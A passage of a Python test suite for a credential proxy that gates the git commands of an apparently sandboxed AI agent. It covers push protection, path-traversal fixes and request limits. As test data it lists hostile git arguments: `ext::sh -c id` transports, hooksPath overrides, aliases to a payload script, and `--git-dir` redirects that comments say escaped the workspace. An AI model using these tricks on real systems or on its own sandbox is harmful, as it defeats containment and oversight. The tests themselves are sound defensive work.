        violation, exec_argv = executor.resolve_git_command(["git", "gc"], cwd=str(repo_alias))
        self.assertIsNone(violation)
        self.assertEqual(["git", "gc"], exec_argv)

        # Unknown subcommands that are not recognized git builtins or defined aliases fail closed (#1498)
        violation, _ = executor.resolve_git_command(["git", "zz-unknown"], cwd=str(repo_alias))
        self.assertIsNotNone(violation)
        self.assertIn("not a recognized git subcommand or alias", violation or "")

        # Abbreviated push options like --rep consume separate values and refuse refspec-less pushes (#1498)
        v_rep = executor.git_lease_violation(["git", "push", "--rep", "custom_remote", "origin"], cwd=str(repo_alias))
        self.assertIsNotNone(v_rep)
        self.assertIn("without an explicit destination refspec is refused", v_rep or "")

        # Pushes from a subdirectory with -C .. redirect resolve cwd correctly without double redirect (#1498)
        sub_dir = clone_dir / "subdir"
        sub_dir.mkdir()
        executor.require_git_lease = False
        v_sub = executor.git_lease_violation(["git", "-C", "..", "push", "origin", "HEAD:release-trunk"], cwd=str(sub_dir))
        self.assertIsNotNone(v_sub)
        self.assertIn("to protected branch 'release-trunk' is refused", v_sub or "")
        executor.require_git_lease = True

        # Alias expansion whose head is a case-variant of a builtin canonicalizes to lowercase
        # and undergoes push violation and lease checks (#1498, Thread 13)
        self.append_repository_config(
            repo_alias,
            "\n[alias]\n\tp = Push origin HEAD:main\n\tpush = push\n",
        )
        violation, _ = executor.resolve_git_command(["git", "p"], cwd=str(repo_alias))
        self.assertIsNotNone(violation)
        self.assertIn("to protected branch 'main' is refused", violation or "")

        # Direct uppercase variant is rejected as not a recognized git subcommand (#1498)
        violation, _ = executor.resolve_git_command(["git", "Push", "origin", "HEAD:main"], cwd=str(repo_alias))
        self.assertIsNotNone(violation)
        self.assertIn("not a recognized git subcommand or alias", violation or "")

        # lfs is not a git builtin and falls back to alias inspection (#1498, Thread 14)
        self.append_repository_config(
            repo_alias,
            "\n[alias]\n\tlfs = push origin HEAD:main\n",
        )
        violation, _ = executor.resolve_git_command(["git", "lfs"], cwd=str(repo_alias))
        self.assertIsNotNone(violation)
        self.assertIn("to protected branch 'main' is refused", violation or "")

        # Unaliased non-builtin lfs fails closed as unrecognized subcommand
        repo_no_lfs = self.repository(executor, name="repo_no_lfs")
        violation, _ = executor.resolve_git_command(["git", "lfs"], cwd=str(repo_no_lfs))
        self.assertIsNotNone(violation)
        self.assertIn("not a recognized git subcommand or alias", violation or "")

        # Bounded file reads: oversized refs/remotes/<remote>/HEAD or .git files are skipped (#1498, Thread 15)
        oversized_head = repo_alias / ".git" / "refs" / "remotes" / "origin" / "HEAD"
        oversized_head.parent.mkdir(parents=True, exist_ok=True)
        oversized_head.write_text("ref: refs/remotes/origin/main\n" + "x" * 8192, encoding="utf-8")
        from credential_proxy import _detect_repo_default_branch, _find_repo_root
        self.assertIsNone(_detect_repo_default_branch(repo_alias, "origin"))

        # Valid small HEAD ref is detected
        oversized_head.write_text("ref: refs/remotes/origin/release-trunk\n", encoding="utf-8")
        self.assertEqual(_detect_repo_default_branch(repo_alias, "origin"), "release-trunk")

        # Oversized .git file is skipped by _find_repo_root
        fake_sub = repo_alias / "subproject"
        fake_sub.mkdir()
        fake_git = fake_sub / ".git"
        fake_git.write_text("gitdir: ../.git\n" + "y" * 8192, encoding="utf-8")
        self.assertEqual(_find_repo_root(fake_sub), repo_alias)

    def test_the_push_remote_cannot_name_a_head_file_outside_refs_remotes(self):
        # CodeQL alert #38, py/path-injection. The `<repository>` argument of
        # `git push` went into `refs/remotes/<repository>/HEAD` unchecked, so
        # a path in that slot read a file of the agent's choosing and the gate
        # took whatever branch it named as the remote's default. Verified on
        # the pre-fix module with the files below planted: each of the five
        # traversals lands on one of them, and each turned `HEAD:feature` into
        # a refused push.
        from credential_proxy import (
            _detect_repo_default_branch,
            _is_git_remote_name,
            _remote_head_path,
            git_push_violation,
        )

        executor = self.executor()
        repo = self.repository(executor)
        remotes = repo / ".git" / "refs" / "remotes"
        for name, head in (("origin", "release-trunk"), ("upstream", "trunk")):
            (remotes / name).mkdir(parents=True)
            (remotes / name / "HEAD").write_text(
                f"ref: refs/remotes/{name}/{head}\n", encoding="utf-8"
            )
        outside = Path(self.temp_dir.name) / "planted"
        for planted in (
            outside / "HEAD",  # `../../../../planted` and the absolute path
            repo / ".git" / "refs" / "HEAD",  # `..`
            repo / ".git" / "refs" / "planted" / "HEAD",  # `origin/../../planted`, `team/../../planted`
        ):
            planted.parent.mkdir(parents=True, exist_ok=True)
            planted.write_text("ref: refs/heads/feature\n", encoding="utf-8")

        traversal = os.path.relpath(outside, remotes)
        for remote in (traversal, str(outside), "..", "origin/../../planted", "team/../../planted"):
            with self.subTest(remote=remote):
                self.assertIsNone(_remote_head_path(remotes, remote))
                # Not looked up, so origin decides -- not the planted file.
                self.assertEqual(_detect_repo_default_branch(repo, remote), "release-trunk")
                self.assertIsNone(
                    git_push_violation(["git", "push", remote, "HEAD:feature"], cwd=repo)
                )

        # A remote name still reads its own tracking HEAD, origin included.
        self.assertEqual(_remote_head_path(remotes, "upstream"), remotes / "upstream" / "HEAD")
        self.assertEqual(_detect_repo_default_branch(repo, "upstream"), "trunk")
        self.assertIn(
            "protected branch 'trunk'",
            git_push_violation(["git", "push", "upstream", "HEAD:trunk"], cwd=repo) or "",
        )
        self.assertIn(
            "protected branch 'release-trunk'",
            git_push_violation(["git", "push", "origin", "HEAD:release-trunk"], cwd=repo) or "",
        )
        # A URL in the repository slot has no tracking HEAD and is judged
        # against origin, as it was before.
        self.assertIn(
            "protected branch 'release-trunk'",
            git_push_violation(
                ["git", "push", "https://example.invalid/acme/fleet.git", "HEAD:release-trunk"],
                cwd=repo,
            )
            or "",
        )

        # The pre-check is thin on purpose -- containment is the sink's job --
        # so every name git accepts is still looked up, slash-named remotes and
        # the ones an ASCII allowlist would have dropped included.
        for accepted in ("origin", "upstream", "my-fork_2", "fork.v2", "gh+fork", "my@fork", "fôrk", "team/upstream"):
            self.assertTrue(_is_git_remote_name(accepted), accepted)
        for refused in ("", ".", "..", "a\\b", "a\0b"):
            self.assertFalse(_is_git_remote_name(refused), repr(refused))
        # And those names keep their protection: each resolves its own HEAD.
        for name, head in (("gh+fork", "plus-trunk"), ("team/upstream", "team-trunk")):
            (remotes / name).mkdir(parents=True)
            (remotes / name / "HEAD").write_text(f"ref: refs/remotes/{name}/{head}\n", encoding="utf-8")
            self.assertEqual(_remote_head_path(remotes, name), remotes / name / "HEAD")
            self.assertIn(
                f"protected branch '{head}'",
                git_push_violation(["git", "push", name, f"HEAD:{head}"], cwd=repo) or "",
            )

    def test_a_git_dir_redirect_cannot_reach_outside_the_workspace(self):
        # `_execute` refuses a cwd outside the shared workspace and the lease
        # gate resolves cwd plus every `-C`, but neither looks at `--git-dir`.
        # So this ran, from inside a valid lease, against a repository on the
        # sidecar's own filesystem — verified before the refusal was added, as
        # both a read and a commit. The containment check is on the working
        # directory, so the flag that stops naming a repository by working
        # directory has to be refused rather than resolved.
        executor = self.executor()
        outside = Path(self.temp_dir.name) / "sidecar-only"
        outside.mkdir()
        subprocess.run(
            ["git", "init", "--quiet"], cwd=outside, check=True, capture_output=True
        )
        argv = [
            "git",
            f"--git-dir={outside / '.git'}",
            f"--work-tree={outside}",
            "commit",
            "--allow-empty",
            "-m",
            "escaped",
        ]
        self.assertIsNotNone(git_argument_violation(argv))
        # And the control: the working-directory check alone does not catch it.
        self.assertIsNone(executor.git_lease_violation(argv, str(self.leased(executor))))

    def leased(self, executor, lease="t_card", repo="acme__fleet"):
        holder = executor.workspace_dir / "gitops" / lease
        (holder / repo).mkdir(parents=True, exist_ok=True)
        (holder / ".lease").write_text(json.dumps({"lease": lease}), encoding="utf-8")
        return holder / repo

    def test_ordinary_git_still_works(self):
        # The hardening is worth nothing if it is reverted next week because it
        # broke the skills, so the paths they actually use are asserted green.
        # `git diff` is in this list because it was not, and a pin that broke
        # it shipped for one commit. `diff.external` was pinned to "" to stop
        # a repository config naming an external diff program; git reads the
        # empty value as a program to execute, so every `git diff` died with
        # `fatal: external diff died`. The test that was supposed to cover it
        # asserted only that the payload had not run, which is true of a
        # command that fails before diffing anything — a control that passes
        # for the wrong reason. The pin is gone; this line is what would have
        # caught it.
        executor = self.executor()
        repository = self.dirty_repository(executor)
        for argv in (
            ["git", "commit", "--allow-empty", "-m", "remediate netpol"],
            ["git", "status", "--porcelain"],
            ["git", "log", "--oneline"],
            ["git", "rev-parse", "--abbrev-ref", "HEAD"],
            ["git", "diff"],
            ["git", "diff", "--cached", "--quiet"],
            ["git", "config", "user.email", "audit@kube-agents.invalid"],
        ):
            result = executor.execute(argv, cwd=str(repository))
            self.assertEqual(0, result.exit_code, f"{argv}: {result.stderr}")


class GitArgumentRefusalTest(unittest.TestCase):
    """The backup check: argv that would override the environment.

    `-c` sets configuration at a layer that outranks the forced-config
    environment — verified against real git — so this is the only thing
    standing between an agent and `-c core.hooksPath=…`. It is a backup for the
    `ext::` transport, where GIT_ALLOW_PROTOCOL is the boundary, and the
    control for hooks, where it is not.
    """

    def test_refuses_the_flags_that_override_the_environment(self):
        for argv in (
            ["git", "-c", "protocol.ext.allow=always", "clone", "ext::sh -c id", "d"],
            ["git", "-c", "core.hooksPath=/opt/data/hooks", "commit", "-m", "x"],
            ["git", "--config-env=core.hooksPath=EVIL", "commit", "-m", "x"],
            ["git", "--exec-path=/opt/data/bin", "status"],
            ["git", "--exec-path", "/opt/data/bin", "status"],
            ["git", "--git-dir=/home/hermes/.git", "log"],
            ["git", "--git-dir", "/home/hermes/.git", "log"],
            ["git", "--work-tree=/home/hermes", "checkout", "--", "."],
        ):
            with self.subTest(argv=argv):
                self.assertIsNotNone(git_argument_violation(argv))

    def test_allows_the_git_the_skills_actually_run(self):
        for argv in (
            ["git", "clone", "--quiet", "https://github.com/acme/fleet.git", "d"],
            ["git", "--literal-pathspecs", "add", "--", "clusters/prod"],
            ["git", "commit", "-m", "remediate netpol"],
            ["git", "push", "--force-with-lease", "origin", "fleet-audit/x"],
            ["git", "-C", "/opt/data/gitops/t_card/acme__fleet", "status"],
            ["git", "checkout", "--force", "-B", "audit", "origin/main"],
            # `submodule update` is the guard on refusing `foreach`: the
            # refusal has to land on the inner verb, because `submodule` itself
            # is a working-tree write the product performs. Widening the
            # refusal from `foreach` to `submodule` turns this line red.
            ["git", "submodule", "update", "--init"],
            # `-u` and `--oneline` are here because `-O` is matched as a
            # prefix rather than as a whole argument. Neither is caught today;
            # they are the regression guard on a future maintainer widening
            # that prefix, which is the failure mode a prefix match invites.
            ["git", "log", "--oneline", "-n", "5"],
            ["git", "push", "-u", "origin", "fleet-audit/x"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNone(git_argument_violation(argv))

    def test_refuses_the_abbreviations_git_accepts(self):
        # git's *subcommand* options are parsed by parse-options, which takes
        # any unambiguous prefix. Every one of these was demonstrated running
        # against a checker that matched the full spelling only, and the
        # `config --glo` line is the sharp one: it wrote an alias into the
        # broker's own global config and `git zz` then executed it, which is a
        # vector this file had already closed and a release note would have
        # said was fixed.
        #
        # git's own options are the asymmetry that hides this. `--git-dir`,
        # `--exec-path` and `--config-env` are compared exactly in git.c and
        # are not abbreviable, so a test written only against those spellings
        # says the problem does not exist.
        for argv in (
            ["git", "config", "--glo", "alias.zz", "!/opt/data/payload.sh"],
            ["git", "config", "--sys", "alias.zz", "!/opt/data/payload.sh"],
            ["git", "rebase", "--exe", "/opt/data/payload.sh", "HEAD~1"],
            ["git", "rebase", "--ex=/opt/data/payload.sh", "HEAD~1"],
            ["git", "grep", "--open=/opt/data/payload.sh", "apiVersion"],
            ["git", "clone", "--upload-pac", "/opt/data/payload.sh", "/tmp/r", "d"],
            ["git", "push", "--receive-pac=/opt/data/payload.sh", "origin", "main"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNotNone(git_argument_violation(argv))

    def test_an_abbreviation_match_does_not_swallow_unrelated_flags(self):
        # The match is "the argument is a prefix of a refused option", not the
        # reverse, so a longer flag that merely shares a first letter is
        # untouched. Inverting the comparison would refuse every one of these
        # and break the skills, which is the failure mode the rule invites.
        for argv in (
            ["git", "log", "--oneline"],              # vs --open-files-in-pager
            ["git", "diff", "--cached"],              # vs --config-env
            ["git", "add", "--update", "--", "x"],    # vs --upload-pack
            ["git", "log", "--graph"],                # vs --git-dir
            ["git", "push", "--set-upstream", "o", "b"],   # vs --system
            ["git", "config", "--get", "remote.origin.url"],  # vs --git-dir
            ["git", "clone", "--recurse-submodules", "u", "d"],  # vs --receive-pack
            ["git", "commit", "--allow-empty", "-m", "x"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNone(git_argument_violation(argv))

    def test_scopes_itself_to_git(self):
        # `-c` is a container selector for kubectl and must keep working.
        self.assertIsNone(git_argument_violation(["kubectl", "logs", "-c", "istio"]))
        self.assertIsNone(git_argument_violation(["gh", "pr", "view", "-c"]))

    def test_matches_the_flag_wherever_it_appears(self):
        # Scanned across the whole argv rather than only the region before the
        # subcommand, where git honours it. Agreeing with git about where the
        # options end would be a guess about git's parser, and every Critical
        # this project has found was a checker and an executor disagreeing
        # about exactly that. Refusing a literal `-c` argument is the price.
        self.assertIsNotNone(git_argument_violation(["git", "commit", "-c", "HEAD"]))


class _ExecRouteServer(unittest.TestCase):
    """A proxy serving /v1/exec on loopback, with an empty policy."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)
        policy_path = Path(self.temp_dir.name) / "policy.json"
        policy_path.write_text(
            json.dumps({"blockedMessage": "blocked", "rules": []}), encoding="utf-8"
        )
        CredentialProxyHandler.policy = Policy.load(str(policy_path))
        CredentialProxyHandler.executor = CommandExecutor(
            timeout_seconds=5,
            max_output_bytes=4096,
            state_dir=str(Path(self.temp_dir.name) / "state"),
            scoped_pool=None,
        )
        CredentialProxyHandler.max_request_bytes = 65536
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), CredentialProxyHandler)
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.addCleanup(self.server.server_close)
        self.addCleanup(self.server.shutdown)

    def post(self, payload):
        request = urllib.request.Request(
            f"http://127.0.0.1:{self.server.server_port}/v1/exec",
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(request) as response:
                return response.status, json.loads(response.read())
        except urllib.error.HTTPError as error:
            return error.code, json.loads(error.read())


class GitLeaseGateWiringTest(_ExecRouteServer):
    """The git gates over HTTP, through /v1/exec.

    `/v1/exec` refuses `git` outright (`ExecRouteRefusesGitTest`), so these
    put it back on the route to reach the gates behind that refusal: they are
    what stands if `git` is ever admitted there again.
    """

    def setUp(self):
        patcher = mock.patch.object(
            credential_proxy,
            "EXEC_ROUTE_EXECUTABLES",
            (*credential_proxy.EXEC_ROUTE_EXECUTABLES, "git"),
        )
        patcher.start()
        self.addCleanup(patcher.stop)
        super().setUp()

    def test_an_unleased_commit_comes_back_as_a_policy_block(self):
        # The shim renders `SECURITY_POLICY_BLOCKED` as a refusal the agent can
        # read and act on, rather than an unexplained proxy failure.
        workspace = CredentialProxyHandler.executor.workspace_dir
        status, body = self.post(
            {"argv": ["git", "commit", "-m", "x"], "cwd": str(workspace)}
        )
        self.assertEqual(403, status)
        self.assertEqual("blocked", body["status"])
        self.assertEqual("SECURITY_POLICY_BLOCKED", body["code"])
        self.assertEqual("git.workspace.lease", body["rule"])
        self.assertIn("audit_report.py start", body["message"])

    def test_a_config_flag_comes_back_as_a_policy_block(self):
        # Refused before the lease check, and with its own rule id: an agent
        # that gets "take a lease" back for `git -c` would take a lease and try
        # again, which is a refusal that teaches the wrong lesson.
        workspace = CredentialProxyHandler.executor.workspace_dir
        status, body = self.post(
            {
                "argv": ["git", "-c", "protocol.ext.allow=always", "clone",
                         "ext::sh -c id", "d"],
                "cwd": str(workspace),
            }
        )
        self.assertEqual(403, status)
        self.assertEqual("SECURITY_POLICY_BLOCKED", body["code"])
        self.assertEqual("git.argument.refused", body["rule"])

    def test_a_leased_commit_reaches_the_executor(self):
        workspace = (
            CredentialProxyHandler.executor.workspace_dir / "gitops" / "t_card"
        )
        (workspace / "acme__fleet").mkdir(parents=True)
        (workspace / ".lease").write_text('{"lease": "t_card"}', encoding="utf-8")
        status, body = self.post(
            {
                "argv": ["git", "status", "--porcelain"],
                "cwd": str(workspace / "acme__fleet"),
            }
        )
        # git runs and fails on "not a repository" — what matters is that the
        # gate let it through rather than answering 403 itself.
        self.assertEqual(200, status)
        self.assertEqual("completed", body["status"])

    def test_an_alias_in_leased_repo_is_expanded_and_executed_over_v1_exec(self):
        workspace = (
            CredentialProxyHandler.executor.workspace_dir / "gitops" / "t_card"
        )
        repo_dir = workspace / "acme__fleet"
        subprocess.run(["git", "init", "--quiet", str(repo_dir)], check=True)
        subprocess.run(["git", "-C", str(repo_dir), "config", "alias.status-short", "status --porcelain"], check=True)
        (workspace / ".lease").write_text('{"lease": "t_card"}', encoding="utf-8")

        executed_argvs = []
        original_execute = CredentialProxyHandler.executor.execute

        def recording_execute(argv, **kwargs):
            executed_argvs.append(argv)
            return original_execute(argv, **kwargs)

        with mock.patch.object(CredentialProxyHandler.executor, "execute", side_effect=recording_execute):
            status, body = self.post(
                {
                    "argv": ["git", "status-short"],
                    "cwd": str(repo_dir),
                }
            )
        self.assertEqual(200, status)
        self.assertEqual("completed", body["status"])
        self.assertTrue(len(executed_argvs) > 0)
        self.assertEqual(["git", "status", "--porcelain"], executed_argvs[0])


class ExecRouteRefusesGitTest(_ExecRouteServer):
    """`git` posted to /v1/exec never runs, leased workspace or not.

    The broker's `git` carries its credential helper, so a read the lease gate
    does not fence -- `ls-remote` of a private repository -- would answer under
    the broker's credential. A sandbox reaches a repository through the verbs.
    """

    def assert_refused(self, argv, cwd):
        status, body = self.post({"argv": argv, "cwd": cwd})
        self.assertEqual(403, status)
        self.assertEqual("executable.allowlist", body["rule"])

    def test_a_read_the_lease_gate_does_not_fence_is_refused(self):
        workspace = CredentialProxyHandler.executor.workspace_dir
        self.assert_refused(
            ["git", "ls-remote", "https://github.com/acme/private.git"], str(workspace)
        )

    def test_a_leased_command_is_refused_too(self):
        workspace = (
            CredentialProxyHandler.executor.workspace_dir / "gitops" / "t_card"
        )
        (workspace / "acme__fleet").mkdir(parents=True)
        (workspace / ".lease").write_text('{"lease": "t_card"}', encoding="utf-8")
        self.assert_refused(["git", "status", "--porcelain"], str(workspace / "acme__fleet"))
        self.assertNotIn("git", credential_proxy.EXEC_ROUTE_EXECUTABLES)


class ExecRouteCapacityTest(unittest.TestCase):
    """The concurrency cap and the caller watch as the agent meets them: over /v1/exec."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)
        policy_path = Path(self.temp_dir.name) / "policy.json"
        policy_path.write_text(
            json.dumps({"blockedMessage": "blocked", "rules": []}), encoding="utf-8"
        )
        CredentialProxyHandler.policy = Policy.load(str(policy_path))
        CredentialProxyHandler.executor = CommandExecutor(
            timeout_seconds=5,
            max_output_bytes=4096,
            state_dir=str(Path(self.temp_dir.name) / "state"),
            scoped_pool=None,
        )
        stub_dir = Path(self.temp_dir.name) / "bin"
        stub_dir.mkdir()
        stub = stub_dir / "kubectl"
        stub.write_text("#!/bin/bash\necho pods\n", encoding="utf-8")
        stub.chmod(0o755)
        CredentialProxyHandler.executor.executables["kubectl"] = str(stub)
        CredentialProxyHandler.max_request_bytes = 65536
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), CredentialProxyHandler)
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.addCleanup(self.server.server_close)
        self.addCleanup(self.server.shutdown)

    def post(self, payload, path="/v1/exec"):
        request = urllib.request.Request(
            f"http://127.0.0.1:{self.server.server_port}{path}",
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(request) as response:
                return response.status, json.loads(response.read())
        except urllib.error.HTTPError as error:
            return error.code, json.loads(error.read())

    def assert_slot_released(self, executor):
        """The slot goes once the response is written, and the client can read
        that response a moment before the handler thread leaves the `with`;
        wait for the release rather than race it."""
        deadline = time.monotonic() + 5
        while executor.slots_in_use and time.monotonic() < deadline:
            time.sleep(0.01)
        self.assertEqual(0, executor.slots_in_use)

    @staticmethod
    @contextlib.contextmanager
    def no_slot_free(caller=None):
        """What `request_slot` does when every slot stays busy for the wait."""
        raise credential_proxy.CommandSlotUnavailable("limit of 8 concurrent commands and this request waited 60s without reaching a free slot")
        yield  # pragma: no cover -- makes this a generator, as a context manager needs

    def test_a_vcs_verb_at_the_cap_answers_the_same_503(self):
        # The slot is the request's, taken by the route before the verb runs,
        # so a broker at its cap has to read as busy there too, not as a fault.
        with (
            mock.patch.object(CredentialProxyHandler, "vcs", object(), create=True),
            mock.patch.object(
                credential_proxy.vcs_broker,
                "route_table",
                return_value={"probe": lambda payload: {"ok": True}},
            ),
            mock.patch.object(CredentialProxyHandler.executor, "request_slot", self.no_slot_free),
        ):
            status, body = self.post({}, path="/v1/vcs/probe")

        self.assertEqual(503, status)
        self.assertEqual("CREDENTIAL_PROXY_BUSY", body["code"])
        self.assertIn("limit of 8 concurrent commands and this request waited 60s without reaching a free slot", body["error"])

    def test_the_vcs_route_holds_its_slot_until_the_response_is_written(self):
        # The route that runs the largest children the broker forks -- git
        # clone and fetch -- is bounded the same way the exec route is: the
        # slot is held through the verb and through the write of its answer.
        seen = []
        executor = CredentialProxyHandler.executor
        original = CredentialProxyHandler._json

        def verb(payload):
            seen.append(("verb", executor.slots_in_use))
            return {"ok": True}

        def recording(handler, status, payload):
            seen.append(("write", executor.slots_in_use))
            return original(handler, status, payload)

        with (
            mock.patch.object(CredentialProxyHandler, "vcs", object(), create=True),
            mock.patch.object(
                credential_proxy.vcs_broker, "route_table", return_value={"probe": verb}
            ),
            # About the slot, not the managed-repository gate the stand-in
            # broker has no registry for.
            mock.patch.object(
                credential_proxy.vcs_broker, "UNGATED_VERBS", frozenset({"probe"})
            ),
            mock.patch.object(CredentialProxyHandler, "_json", recording),
        ):
            status, body = self.post({}, path="/v1/vcs/probe")

        self.assertEqual(200, status)
        self.assertEqual({"ok": True}, body)
        self.assertEqual([("verb", 1), ("write", 1)], seen)
        self.assert_slot_released(executor)

    def raw_request(self, target, body, content_length=None):
        """Send one HTTP request on a raw socket and return the socket unread.

        For the callers the route tests cannot make with urllib: one that never
        reads its response, one that never finishes sending its body.
        """
        sock = socket.create_connection(("127.0.0.1", self.server.server_port))
        self.addCleanup(sock.close)
        length = len(body) if content_length is None else content_length
        sock.sendall(
            f"POST {target} HTTP/1.0\r\nContent-Type: application/json\r\n"
            f"Content-Length: {length}\r\n\r\n".encode("ascii")
            + body
        )
        return sock

    def test_a_caller_that_stops_reading_is_given_up_on_and_its_slot_freed(self):
        # The slot is held through the write, so a caller that never reads a
        # body larger than the socket buffers would otherwise keep it forever.
        executor = CredentialProxyHandler.executor
        stub = Path(executor.executables["kubectl"])
        stub.write_text("#!/bin/bash\nhead -c 16777216 /dev/zero | tr '\\0' a\n", encoding="utf-8")
        with (
            mock.patch.object(executor, "max_output_bytes", 16 << 20),
            mock.patch.object(credential_proxy, "RESPONSE_WRITE_TIMEOUT_SECONDS", 1),
            self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs,
        ):
            self.raw_request("/v1/exec", json.dumps({"argv": ["kubectl", "get", "pods"]}).encode())
            deadline = time.monotonic() + 10
            while not any("response not delivered" in line for line in logs.output):
                if time.monotonic() > deadline:
                    self.fail("the write to a caller that never reads was not given up on")
                time.sleep(0.1)

        self.assert_slot_released(executor)

    def test_a_caller_that_stalls_mid_body_on_the_vcs_route_frees_its_slot(self):
        # The vcs body is read inside the slot, so a caller that announces a
        # body and stops sending would keep a slot with nothing running in it;
        # a stalled peer is no hang-up, so a deadline is what ends it.
        executor = CredentialProxyHandler.executor
        with (
            mock.patch.object(CredentialProxyHandler, "vcs", object(), create=True),
            mock.patch.object(
                credential_proxy.vcs_broker,
                "route_table",
                return_value={"probe": lambda payload: {"ok": True}},
            ),
            mock.patch.object(credential_proxy, "REQUEST_READ_TIMEOUT_SECONDS", 1),
            self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs,
        ):
            self.raw_request("/v1/vcs/probe", b'{"partial": ', content_length=1000)
            deadline = time.monotonic() + 10
            while not any("request body not received" in line for line in logs.output):
                if time.monotonic() > deadline:
                    self.fail("the stalled body was not given up on")
                time.sleep(0.1)

        self.assert_slot_released(executor)

    def test_a_body_that_trickles_in_is_given_up_on_at_the_deadline(self):
        # A socket timeout bounds one recv, so a byte every so often would
        # keep a full stall from ever showing; the whole body has to arrive
        # within one deadline, however it is paced.
        executor = CredentialProxyHandler.executor
        stop = threading.Event()
        self.addCleanup(stop.set)

        def trickle(sock):
            # A byte well inside the per-recv window, for as long as the test
            # runs; the deadline, not the gaps, has to end the read.
            while not stop.is_set():
                try:
                    sock.sendall(b" ")
                except OSError:
                    return
                stop.wait(0.3)

        with (
            mock.patch.object(CredentialProxyHandler, "vcs", object(), create=True),
            mock.patch.object(
                credential_proxy.vcs_broker,
                "route_table",
                return_value={"probe": lambda payload: {"ok": True}},
            ),
            mock.patch.object(credential_proxy, "REQUEST_READ_TIMEOUT_SECONDS", 1),
            self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs,
        ):
            sock = self.raw_request("/v1/vcs/probe", b"{", content_length=1000)
            threading.Thread(target=trickle, args=(sock,), daemon=True).start()
            started = time.monotonic()
            deadline = time.monotonic() + 10
            while not any("request body not received" in line for line in logs.output):
                if time.monotonic() > deadline:
                    self.fail("the trickling body was never given up on")
                time.sleep(0.1)
            elapsed = time.monotonic() - started
        stop.set()

        # Given up on at about the deadline, not after the whole body's worth of gaps.
        self.assertLess(elapsed, 4)
        self.assert_slot_released(executor)

    def test_a_caller_that_hangs_up_while_queued_is_logged_by_the_route(self):
        # The executor-level test proves the refusal; this one proves the exec
        # route turns it into its log line and starts nothing. Over a Unix
        # socket, as in production: on the TCP listener the other tests use, a
        # closed peer reports no POLLHUP, and the route runs unwatched there
        # by design.
        executor = CredentialProxyHandler.executor
        single = CommandExecutor(
            timeout_seconds=5,
            max_output_bytes=4096,
            state_dir=str(Path(self.temp_dir.name) / "single"),
            scoped_pool=None,
            max_concurrent_commands=1,
        )
        single.executables["kubectl"] = executor.executables["kubectl"]
        socket_path = Path(self.temp_dir.name) / "broker.sock"
        unix_server = credential_proxy.ThreadingUnixHTTPServer(
            str(socket_path), CredentialProxyHandler
        )
        threading.Thread(target=unix_server.serve_forever, daemon=True).start()
        self.addCleanup(unix_server.server_close)
        self.addCleanup(unix_server.shutdown)
        held = threading.Event()
        release = threading.Event()

        def hold():
            with single.request_slot():
                held.set()
                release.wait(10)

        holder = threading.Thread(target=hold)
        holder.start()
        self.addCleanup(holder.join)
        self.addCleanup(release.set)
        self.assertTrue(held.wait(5))
        with (
            mock.patch.object(CredentialProxyHandler, "executor", single),
            self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs,
        ):
            body = json.dumps({"argv": ["kubectl", "get", "pods"]}).encode()
            sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            sock.connect(str(socket_path))
            sock.sendall(
                b"POST /v1/exec HTTP/1.0\r\nContent-Type: application/json\r\n"
                + f"Content-Length: {len(body)}\r\n\r\n".encode("ascii")
                + body
            )
            time.sleep(0.3)
            sock.close()
            deadline = time.monotonic() + 10
            while not any("while queued for a slot" in line for line in logs.output):
                if time.monotonic() > deadline:
                    self.fail("the route never logged the queued hang-up")
                time.sleep(0.1)
        release.set()
        holder.join()

        self.assertEqual(0, single.queued_requests)
        self.assertEqual(0, single.slots_in_use)

    def test_a_broker_at_its_cap_answers_503_with_a_reason_the_shim_prints(self):
        # `error` is the key the shim prints for a non-policy failure, so the
        # agent reads why rather than a bare exit 1 -- and `code` lets a caller
        # tell "busy, retry" from a fault.
        with mock.patch.object(
            CredentialProxyHandler.executor, "request_slot", self.no_slot_free
        ):
            status, body = self.post({"argv": ["kubectl", "get", "pods"]})

        self.assertEqual(503, status)
        self.assertEqual("CREDENTIAL_PROXY_BUSY", body["code"])
        self.assertIn("limit of 8 concurrent commands and this request waited 60s without reaching a free slot", body["error"])

    def test_a_caller_that_hangs_up_while_queued_is_logged_with_what_it_waited_for(self):
        # The exec route's abandon line carries the hang-up's own text, as
        # the vcs and refresh routes' do, so it names the memory budget when
        # that is what held the request rather than always saying "a slot".
        why = "the caller disconnected while queued for the memory budget"

        @contextlib.contextmanager
        def gone(caller=None):
            raise credential_proxy.CallerHungUp(why)
            yield  # pragma: no cover -- makes this a generator, as a context manager needs

        with (
            mock.patch.object(CredentialProxyHandler.executor, "request_slot", gone),
            self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs,
        ):
            connection = http.client.HTTPConnection("127.0.0.1", self.server.server_port)
            self.addCleanup(connection.close)
            connection.request(
                "POST",
                "/v1/exec",
                body=json.dumps({"argv": ["kubectl", "get", "pods"]}),
                headers={"Content-Type": "application/json"},
            )
            # The route writes nothing for a caller that has gone.
            with self.assertRaises((http.client.HTTPException, ConnectionError)):
                connection.getresponse()
        self.assertTrue(
            any(
                "command abandoned request_id=" in line
                and why + "; the command was not started" in line
                for line in logs.output
            ),
            logs.output,
        )

    def test_the_exec_route_holds_its_slot_until_the_response_is_written(self):
        # The slot covers the response as well as the command: released when
        # the command exits, a slow reader keeps its body alive while the next
        # command holds the slot, and the bodies in memory number the callers
        # rather than the cap.
        seen = []
        original = CredentialProxyHandler._json

        def recording(handler, status, payload):
            seen.append(CredentialProxyHandler.executor.slots_in_use)
            return original(handler, status, payload)

